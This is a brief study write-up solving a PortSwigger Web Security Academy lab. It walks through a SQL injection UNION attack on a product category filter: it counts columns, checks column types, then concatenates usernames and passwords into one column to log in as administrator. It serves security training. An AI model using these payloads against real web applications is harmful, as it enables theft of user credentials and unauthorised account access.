---
title: 'Lab: SQL injection UNION attack, retrieving multiple values in a single column'
tags: [Portswigger Web Security Academy, Web]

category: "Security/Practice/Portswigger Web Security Academy/SQL"
---

# Lab: SQL injection UNION attack, retrieving multiple values in a single column
###### tags: `Portswigger Web Security Academy` `Web`
* Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables. 
* Hint:  The database contains a different table called users, with columns called username and password.
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

## Exp
1. Consider how many columns in this table
Payload: `?category=Lifestyle' UNION SELECT NULL,NULL--`
2. Consider the type of each columns
Payload: `?category=Lifestyle' UNION SELECT 1,'a'--`
As the payload above, the 1st column is number-based string, and 2nd column is text-based string.
    :::spoiler Result
    ![](https://i.imgur.com/9V0cYHD.png)
    :::
3. <font color="FF0000">通靈</font>: Find username and password
From the result above, there's just one column is text-based string that we can inject, so we can use concatenate operator `||` to concatenate two strings that we query together.
Payload: `?category=Gifts' UNION SELECT NULL,username||'~'||password FROM users--`
    :::spoiler Result
    ![](https://i.imgur.com/d1zw9eY.png)
    :::
4. Login by username and password that we fetch
    :::spoiler Success Screenshot
    ![](https://i.imgur.com/P9CLaQg.png)
    :::

## Reference